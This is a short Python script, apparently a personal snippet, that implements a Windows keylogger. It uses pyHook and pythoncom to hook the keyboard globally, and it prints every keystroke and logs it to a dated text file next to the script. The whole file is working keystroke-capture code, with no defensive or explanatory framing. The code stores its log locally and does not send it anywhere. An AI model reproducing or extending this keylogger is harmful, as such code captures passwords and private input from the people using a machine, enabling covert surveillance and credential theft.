''' not working properly. Just in case. '''
import sys
import os
import time
import datetime

import logging
import pyHook
import pythoncom

def script_path():
    '''change current path to script one'''
    current_path = os.path.realpath(os.path.dirname(sys.argv[0]))
    os.chdir(current_path)
    return current_path
    
    
def get_time():
    unix = time.time()
    date = str(datetime.datetime.fromtimestamp(unix).strftime("%Y%m%d"))        # strftime("%Y%m%d_%H%M%S")
    return date
    
    
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format="%(message)s")
    key = event.GetKey()
    print(key)
    # print('Alt: {}'.format(event.Alt))
    # print('IsAlt: {}'.format(event.IsAlt()))
    # print('Ascii: {}'.format(event.Ascii))
    # print(dir(event))
    logging.log(10, key)
    return True
    
    
if __name__ == "__main__":
    global file_log
    file_log = os.path.join(script_path(), 'logger_' + get_time() + '.txt')
    
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()